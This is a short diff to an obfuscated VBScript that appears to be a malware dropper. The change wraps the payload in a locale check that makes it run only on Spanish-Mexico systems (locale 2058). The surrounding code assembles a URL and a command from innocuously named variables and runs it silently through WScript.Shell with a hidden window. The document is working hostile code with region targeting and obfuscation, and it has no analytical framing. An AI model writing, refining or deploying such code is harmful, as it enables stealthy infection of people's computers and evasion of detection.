@@ -1,4 +1,5 @@
- 
+mzbNxwRc=GetLocale
+if (mzbNxwRc=2058) then 
  dim mzbNxwRc,mzbNxwRuii
  mzbNxwRuii = mzbNxwRuii & ":"
  mzbNxwRuii = mzbNxwRuii  &   chr(47)
@@ -31,3 +32,4 @@
  command =  oliveira & frutaria & horlandia & vieira & carolina & jaja & carreta & caminhao & bitrem & rodotrem & corcel & belina & fiat & jaguar & var1 & bumwndj & var2
  set shell = CreateObject("WScript.Shell")
  shell.Run command,0
+ End if
